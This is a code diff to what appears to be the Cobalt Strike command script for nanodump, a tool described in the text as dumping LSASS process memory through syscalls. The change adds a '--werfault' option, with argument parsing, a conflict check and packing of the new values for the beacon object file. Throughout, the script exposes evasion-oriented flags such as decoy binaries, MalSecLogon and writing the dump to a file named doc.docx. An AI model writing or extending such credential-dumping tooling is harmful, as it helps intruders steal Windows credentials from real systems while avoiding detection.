@@ -41,9 +41,9 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe]");
+"Usage: nanodump [--getpid] [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--werfault C:\\Windows\\Temp]");
 alias nanodump {
-    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary');
+    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_malseclogon $folder $nanodump_binary $werfault_lsass $use_werfault');
 
     $barch = barch($1);
     if($barch eq "x86")
@@ -69,6 +69,9 @@ alias nanodump {
         return;
     }
 
+    # by default, don't use werfault
+    $werfault_lsass = "";
+    $use_werfault = 0;
     # by default, don't set any decoy binary
     $binary_path = "";
     # by default, do not use MalSecLogon
@@ -167,6 +170,17 @@ alias nanodump {
                 return;
             }
         }
+        else if (@_[$i] eq "--werfault" || @_[$i] eq "-wf")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --werfault value");
+                return;
+            }
+            $use_werfault = 1;
+            $werfault_lsass = @_[$i];
+        }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
             berror($1, beacon_command_detail("nanodump"));
@@ -178,6 +192,14 @@ alias nanodump {
             return;
         }
     }
+    if ($use_werfault &&
+        ($fork || $snapshot || $dup ||
+         $use_malseclogon || $use_valid_sig || $get_pid ||
+         strlen($binary_path) != 0 || $write_file))
+     {
+        berror($1, "The option --werfault cannot be combined with any other");
+        return;
+     }
 
     if($fork && $snapshot)
     {
@@ -228,7 +250,7 @@ alias nanodump {
     }
 
     # pack the arguments
-    $args = bof_pack($1, "iziiiiiiiz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path);
+    $args = bof_pack($1, "iziiiiiiiziz", $pid, $dump_path, $write_file, $use_valid_sig, $fork, $snapshot, $dup, $get_pid, $use_malseclogon, $binary_path, $use_werfault, $werfault_lsass);
 
     # run
     btask($1, "Running NanoDump BOF");
